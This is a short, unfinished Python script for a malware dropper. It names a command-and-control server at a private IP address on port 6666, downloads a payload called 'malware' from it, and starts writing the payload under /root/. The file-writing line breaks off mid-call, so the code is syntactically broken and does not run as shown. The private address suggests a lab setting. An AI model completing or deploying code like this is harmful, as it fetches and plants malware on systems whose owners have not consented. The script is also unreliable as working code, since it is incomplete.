import requests

class Dropper():
    CNC_ADDRESS="http://172.19.0.2:6666/"

    def get_malware(self):
        url = Dropper.CNC_ADDRESS + "malware"
        resp = requests.get(url)
        malware = resp.content

        with open("/root/")


if __name__=="__main__":
    dropper = Dropper()
    dropper.get_malware()
